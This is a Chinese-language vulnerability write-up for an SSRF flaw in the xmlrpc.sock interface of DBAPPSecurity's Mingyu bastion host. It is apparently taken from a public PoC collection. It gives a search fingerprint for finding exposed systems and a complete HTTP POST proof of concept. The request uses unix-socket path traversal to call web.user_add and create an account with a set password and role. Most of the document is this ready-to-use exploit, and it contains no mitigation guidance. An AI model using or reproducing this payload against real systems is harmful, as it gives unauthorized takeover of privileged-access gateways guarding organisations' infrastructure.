# 安恒 明御运维审计与风险控制系统 xmlrpc.sock 任意用户添加漏洞

## 漏洞描述

安恒 明御运维审计与风险控制系统 xmlrpc.sock 接口存在SSRF漏洞，通过漏洞可以添加任意用户控制堡垒机

## 漏洞影响

安恒 明御运维审计与风险控制系统

## 网络测绘

```
"明御运维审计与风险控制系统"
```

## 漏洞复现

登陆页面

![image-20230828163144773](images/image-20230828163144773.png)

验证POC

```
POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
Host: 
Cookie: LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3
Content-Length: 1117
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0"?>  
<methodCall>
<methodName>web.user_add</methodName>
<params>
<param>
<value>
<array>
<data>
<value>
<string>admin</string>
</value>
<value>
<string>5</string>
</value>
<value>
<string>10.0.0.1</string>
</value>
</data>
</array>
</value>
</param>
<param>
<value>
<struct>
<member>
<name>uname</name>
<value>
<string>test</string>
</value>
</member>
<member>
<name>name</name>
<value>
<string>test</string>
</value>
</member>
<member>
<name>pwd</name>
<value>
<string>1qaz@3edC12345</string>
</value>
</member>
<member>
<name>authmode</name>
<value>
<string>1</string>
</value>
</member>
<member>
<name>deptid</name>
<value>
<string></string>
</value>
</member>
<member>
<name>email</name>
<value>
<string></string>
</value>
</member>
<member>
<name>mobile</name>
<value>
<string></string>
</value>
</member>
<member>
<name>comment</name>
<value>
<string></string>
</value>
</member>
<member>
<name>roleid</name>
<value>
<string>102</string>
</value>
</member>
</struct></value>
</param>
</params>
</methodCall>
```

![image-20230828163201512](images/image-20230828163201512.png)